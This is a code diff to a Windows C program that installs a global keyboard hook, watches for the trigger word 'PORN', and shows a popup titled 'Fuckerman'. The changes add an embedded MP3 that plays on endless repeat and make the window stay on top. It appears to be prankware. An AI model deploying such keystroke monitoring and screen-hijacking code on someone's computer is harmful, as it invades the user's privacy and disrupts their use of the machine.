@@ -2,6 +2,7 @@
 #include <Windows.h>
 #include <string.h>
 #include <inttypes.h>
+#include <mmsystem.h>
 #include "resource.h"
 
 
@@ -24,7 +25,24 @@ char lastword = {0};
 char triggerword[5] = "PORN";
 unsigned int keypressed_counter = 0;
 
+void PlayAudio() {
+    // Load the mp3 file from resource and save it as a file on the drive
+    HRSRC resouce = FindResource(NULL, MAKEINTRESOURCE(IDR_MP3FILE1), "MP3");
+    HGLOBAL resource_data = LoadResource(NULL, resouce);
+    void * resource_pointer = LockResource(resource_data);
+    DWORD size = SizeofResource(NULL, resouce);
 
+    HANDLE file = CreateFile("song.mp3", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    DWORD written;
+    WriteFile(file, resource_pointer, size, &written, NULL);
+    CloseHandle(file);
+
+    // Play audio
+    mciSendString("open \"song.mp3\" type mpegvideo alias mp3", NULL, 0, NULL);
+    mciSendString("play mp3 from 0 repeat", NULL, 0, NULL);
+
+
+};
 
 LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
     if (wParam == WM_KEYDOWN) {
@@ -81,6 +99,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, unsigned int uMsg, WPARAM wParam, LPARAM 
         }
     case WM_SHOWWINDOW:
         ShowWindow(hwnd, SW_SHOW);
+        PlayAudio();
         return 0;
     case WM_CLOSE:
 
@@ -181,7 +200,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, 
 
 
     hwnd = CreateWindowEx(
-            WS_EX_LAYERED,                  // extended styles
+            WS_EX_LAYERED | WS_EX_TOPMOST,                  // extended styles
             classname, // Class name
             "Fuckerman",     // Window title
             WS_POPUP, // Window style
@@ -194,7 +213,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pCmdLine, 
             hInstance,           // Application instance(handle that window passess to id this running program)
             NULL                 // No additional parameters(u can pass any data u like here to window procedure if u want to make persistent data in window procedure loop)
         );
-    //(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
 
     if (hwnd == NULL) {
         return 0;
